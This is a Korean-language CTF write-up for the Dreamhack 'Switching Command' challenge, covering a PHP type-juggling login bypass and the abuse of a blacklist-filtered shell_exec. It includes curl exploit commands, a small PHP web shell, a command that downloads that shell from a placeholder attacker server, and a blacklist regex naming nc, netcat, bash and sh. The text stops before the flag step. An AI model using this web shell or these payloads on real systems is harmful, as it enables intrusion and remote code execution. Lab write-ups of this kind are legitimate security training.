# Switching Command

[문제 링크](https://dreamhack.io/wargame/challenges/1081)

## 문제 분석

이 문제는 PHP 애플리케이션의 로그인 로직에서 발생하는 느슨한 비교(Loose Comparison) 취약점을 이용해 `admin` 세션을 획득한 뒤, 관리자 전용 페이지(`test.php`)의 명령어 실행 필터링을 우회하여 웹셸을 업로드하고 플래그를 획득하는 구조입니다.

제공된 로그인 처리 코드와 `test.php`의 명령어 실행 코드는 다음과 같습니다.

```php
if ($_SERVER["REQUEST_METHOD"]=="POST"){
    $data = json_decode($_POST["username"]);

    if ($data === null) {
        exit("Failed to parse JSON data");
    }
        
    $username = $data->username;

    if($username === "admin" ){
        exit("no hack");
    }

    switch($username){
        case "admin":
            $user = "admin";
            $password = "***REDACTED***";
            $stmt = $conn -> prepare("SELECT * FROM users WHERE username = ? AND password = ?");
            $stmt -> bind_param("ss",$user,$password);
            $stmt -> execute();
            $result = $stmt -> get_result();
            if ($result -> num_rows == 1){
                $_SESSION["auth"] = "admin";
                header("Location: test.php");
            } else {
                $message = "Something wrong...";
            }
            break;
        default:
            $_SESSION["auth"] = "guest";
            header("Location: test.php");
            
    }
}
```

```php
$pattern = '/\b(flag|nc|netcat|bin|bash|rm|sh)\b/i';

if($_SESSION["auth"] === "admin"){

    $command = isset($_GET["cmd"]) ? $_GET["cmd"] : "ls";
    $sanitized_command = str_replace("\n","",$command);
    if (preg_match($pattern, $sanitized_command)){
        exit("No hack");
    }
    $resulttt = shell_exec(escapeshellcmd($sanitized_command));
}
else if($_SESSION["auth"]=== "guest") {

    $command = "echo hi guest";
    $result = shell_exec($command);

}
```

로그인 엔드포인트는 `POST` 요청으로 전달된 `username` 파라미터를 `json_decode()`로 파싱한 뒤 `$data->username` 값을 꺼내 검증합니다. 이때 `$username === "admin"` 조건문으로 문자열 `"admin"` 입력을 차단하고 있지만, 직후의 `switch ($username)` 구문에서 `case "admin":` 분기를 통과하면 DB에 저장된 관리자 계정 정보로 인증을 수행하고 `$_SESSION["auth"] = "admin"` 세션을 발급한 뒤 `test.php`로 리다이렉트합니다.

`test.php`에서는 `$_SESSION["auth"] === "admin"` 여부를 검사한 후 `GET` 파라미터 `cmd`를 받아 개행 문자(`\n`) 제거, 정규표현식 패턴 검사, `escapeshellcmd()` 이스케이프를 순서대로 적용한 뒤 `shell_exec()`로 시스템 명령어를 실행합니다.

---

## 취약점 분석

### 1. `switch` 구문의 느슨한 비교(Loose Comparison)와 PHP Type Juggling

로그인 코드는 두 단계에 걸쳐 서로 다른 비교 연산 방식을 사용합니다.

```php
if ($username === "admin") {   // 엄격한 비교 (Strict Comparison)
    exit("no hack");
}

switch ($username) {
    case "admin":              // 느슨한 비교 (Loose Comparison, ==)
}
```

1. **JSON 파싱에 의한 타입 보존**: `json_decode($_POST["username"])`는 입력 문자열이 아닌 JSON 자료형을 그대로 PHP 변수 타입으로 복원합니다. 따라서 `{"username": true}`를 전달하면 `$username`에는 문자열이 아닌 불리언 `bool(true)`가 저장됩니다.
2. **엄격한 비교(`===`) 우회**: `===` 연산자는 값과 자료형이 모두 같을 때만 참을 반환합니다. `bool(true) === string("admin")`은 자료형이 다르므로 `false`로 평가되어 `"no hack"` 종료 조건을 건너뜁니다.
3. **`switch-case`의 느슨한 비교(`==`)**: PHP의 `switch` 구문은 내부적으로 각 `case` 값을 `==` 연산자로 비교합니다. PHP에서 불리언(`true`)과 문자열을 `==`로 비교하면 문자열 쪽이 불리언으로 형 변환되며, 빈 문자열(`""`)과 `"0"`을 제외한 비어 있지 않은 문자열은 모두 `true`로 변환됩니다. 결과적으로 `true == "admin"`은 `true == true`가 되어 `true`를 반환합니다.

이에 따라 `{"username": true}`를 전송하면 `"no hack"` 검증을 통과하면서도 `case "admin":` 분기로 진입하여 관리자 세션을 획득할 수 있습니다.

### 2. `test.php`의 블랙리스트 필터링 한계와 `escapeshellcmd()` 오용

관리자 세션으로 `test.php`에 접근하면 다음 방어 로직을 거쳐 `shell_exec()`가 호출됩니다.

cmd의 패턴을 검사하고 있으나 `escapeshellcmd()`는 공백 문자를 차단하지 않으며, 하나의 명령어 뒤에 공백으로 구분된 임의의 옵션과 인자를 전달하는 행위를 막지 못합니다. 또한 차단 목록에 `curl`이나 `-o` 옵션, `.php` 확장자는 포함되어 있지 않습니다. 따라서 외부 서버에 올려둔 웹셸 파일을 `curl [웹셸_URL] -o webshell.php` 명령어로 다운로드하면 정규표현식 필터와 `escapeshellcmd()` 검사를 모두 통과하여 웹 서버 디렉터리에 임의의 PHP 스크립트를 생성할 수 있습니다.

---

## 익스플로잇

### 1. 관리자 세션 쿠키 획득

로그인 엔드포인트에 `username={"username":true}` 데이터를 담아 `POST` 요청을 전송하고 반환되는 세션 쿠키(`PHPSESSID`)를 저장합니다.

```bash
curl -i -c cookies.txt -X POST \
  --data-urlencode 'username={"username":true}' \
  http://host3.dreamhack.games:포트번호/index.php
```


### 2. 외부 웹셸 파일 준비 및 `curl`을 통한 업로드

외부에서 접근 가능한 서버에 명령 실행용 `webshell.php` 파일을 준비합니다.

```php
<?php
if (isset($_GET['c'])) {
    echo "<pre>" . shell_exec($_GET['c']) . "</pre>";
}
?>
```

저장한 `cookies.txt` 세션을 사용하여 `test.php`의 `cmd` 파라미터에 `curl` 다운로드 명령어를 전달합니다. URL에 `&`, `?` 등 `escapeshellcmd()`에 의해 이스케이프되는 메타 문자가 포함되지 않도록 파일 경로 형태의 단순 URL을 지정합니다.

```bash
curl -G -b cookies.txt \
  --data-urlencode "cmd=curl http://공격자_서버주소/webshell.php -o webshell.php" \
  http://host3.dreamhack.games:포트번호/test.php
```

이 명령어 문자열에는 `flag`, `nc`, `netcat`, `bin`, `bash`, `rm`, `sh` 키워드가 포함되지 않으므로 `preg_match()`를 통과하며, 공백과 `-o` 옵션은 `escapeshellcmd()`에 의해 차단되지 않으므로 웹 루트 경로에 `webshell.php` 파일이 생성됩니다.

### 3. 업로드된 웹셸을 통한 플래그 획득

웹셸 파일이 생성되면 `test.php`의 필터링을 거치지 않고 `webshell.php`에 직접 명령어를 전달하여 플래그 파일의 위치와 내용을 조회합니다.